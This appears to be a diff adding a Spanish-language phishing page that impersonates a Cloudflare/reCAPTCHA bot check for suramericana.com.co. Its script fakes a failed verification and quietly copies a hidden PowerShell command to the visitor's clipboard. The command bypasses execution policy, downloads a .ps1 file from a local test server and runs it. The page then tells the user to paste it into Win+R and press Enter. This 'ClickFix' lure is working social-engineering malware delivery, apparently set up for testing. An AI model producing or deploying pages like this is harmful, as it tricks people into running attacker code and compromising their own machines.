@@ -1,0 +1,261 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Verificación</title>
+  <style>
+    body{
+      margin:0;
+      font-family:Arial,Helvetica,sans-serif;
+      background:#f9f9f9;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      height:100vh;
+    }
+
+  .page {
+    width: 100%;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    padding: 40px 20px 24px;
+    box-sizing: border-box;
+  }
+
+  .content {
+    width: 100%;
+    max-width: 960px;
+    margin: 90px auto 0 auto;
+  }
+
+  .footer {
+    width: 100%;
+    max-width: 960px;
+    margin: 0 auto;
+    text-align: center;
+    color: #b8b8b8;
+    font-size: 14px;
+    padding-top: 20px;
+  }
+
+  .card{
+      width:390px;
+      background:#fff;
+      border:1px solid #d9d9d9;
+      border-radius:4px;
+      box-shadow:0 1px 4px rgba(0,0,0,.08);
+      padding:10px;
+    }
+    .row{
+      display:flex;
+      align-items:center;
+      gap:14px;
+    }
+
+    .title {
+      font-size: 58px;
+      font-weight: 700;
+      margin: 0 0 14px 0;
+      letter-spacing: -1px;
+    }
+
+    .subtitle {
+      font-size: 28px;
+      font-weight: 700;
+      margin: 0 0 18px 0;
+      color: hsl(0, 2%, 9%);
+    }
+
+    .desc {
+      font-size: 17px;
+      line-height: 1.6;
+      color: #0a0a0a;
+      max-width: 980px;
+      margin-bottom: 38px;
+    }
+
+    .checkbox{
+      width:25px;
+      height:25px;
+      border:2px solid #c1c1c1;
+      border-radius:2px;
+      background:#fff;
+      cursor:pointer;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      flex:0 0 auto;
+    }
+    .label{
+      font-size:22px;
+      color:#222;
+      user-select:none;
+    }
+    .side{
+      margin-left:auto;
+      text-align:center;
+      font-size:10px;
+      color:#777;
+      line-height:1.2;
+    }
+    .spinner{
+      width:18px;
+      height:18px;
+      border: 4px dotted #298d01;
+      border-radius:50%;
+      animation:spin 1.0s linear infinite;
+      display:none;
+    }
+
+    .msg{
+      margin-top:18px;
+      font-size:15px;
+      color:#333;
+      display:none;
+      line-height:1.5;
+    }
+    .warn{
+      margin-top:12px;
+      background:#fff8e1;
+      border:1px solid #f0d98a;
+      color:#6b5500;
+      padding:12px;
+      border-radius:4px;
+    }
+    .ok{
+      color:#3a1201;
+      font-weight:bold;
+    }
+    @keyframes spin {
+      from { transform:rotate(0deg); }
+      to { transform:rotate(360deg); }
+    }
+
+
+    .footer hr {
+      border: none;
+      border-top: 1px solid #7d7d7d;
+      opacity: 0.7;
+      margin-bottom: 18px;
+    }
+
+    .footer .line1 {
+      margin-bottom: 10px;
+    }
+
+    .footer a {
+      color: #87aefb;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+
+  </style>
+</head>
+<body>
+<div class="page">
+    <div class="content">
+      <h1 class="title">suramericana.com.co</h1>
+      <div class="subtitle">Verificación de seguridad en curso</div>
+      <div class="desc">
+        Este sitio web utiliza un servicio de seguridad para protegerse contra bots
+        maliciosos. Esta página se muestra mientras el sitio web verifica que usted
+        no es un bot.
+      </div>
+      
+    
+
+  <div class="card">
+    <div class="row">
+      <div class="checkbox" id="box" aria-label="checkbox">
+        <div class="spinner" id="spinner"></div>
+      </div>
+      <div class="label" id="label" >No soy un robot</div>
+    <div class="side">
+      <img src="data:image/png;base64,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" alt="recaptcha" class="logo">
+      <br>
+      Privacidad - Términos
+    </div>
+    </div>
+
+    <div class="msg" id="msg">
+      <div class="warn">
+        <p id="status"></p>
+
+      </div>
+    </div>
+  </div>
+
+  </div>
+  
+    <div class="footer">
+      <hr>
+      <div class="line1">Ray ID: 9ecb78cddcaa38d3</div>
+      <div>
+        Rendimiento y seguridad de
+        <a href="#">Cloudflare</a>
+        &nbsp;|&nbsp;
+        <a href="#">Privacidad</a>
+      </div>
+    </div>
+</div>
+
+
+<script>
+function lanzarFix() {
+    const command = "powershell -w hidden -ExecutionPolicy Bypass -c \"Invoke-WebRequest http://127.0.0.1:8000/test.ps1 -OutFile $env:TEMP\\a.ps1; powershell $env:TEMP\\a.ps1\"";
+
+    navigator.clipboard.writeText(command).then(function () {
+        document.getElementById("status").innerHTML =
+            "<b>Para continuar: Verificación en 3 pasos</b><br><br>" +
+            "1. Presiona <b>Win + R</b><br>" +
+            "2. Presiona <b>Ctrl + V</b><br>"+ 
+            "3. Presiona <b>Enter</b>";
+    }).catch(function(err) {
+        console.error("Error al copiar:", err);
+    });
+}
+
+document.addEventListener("DOMContentLoaded", function () {
+    const box = document.getElementById("box");
+    const spinner = document.getElementById("spinner");
+    const msg = document.getElementById("msg");
+    const label = document.getElementById("label");
+
+    let running = false;
+
+    box.addEventListener("click", () => {
+        if (running) return;
+        running = true;
+        box.style.borderColor = "transparent";
+        spinner.style.display = "block";
+        label.textContent = "Verificando...";
+
+        setTimeout(() => {
+            spinner.style.display = "none";
+            //box.innerHTML = "✓";
+            const errorColor = "#b3261e";
+            box.innerHTML = "✕";
+            box.style.fontSize = "22px";
+            box.style.color = errorColor;
+            box.style.borderColor = errorColor;
+            label.textContent = "La verificación falló";
+            msg.style.display = "block";
+
+            lanzarFix();
+        }, 3000);
+    });
+});
+</script>
+
+
+
+
+</body>
+</html>
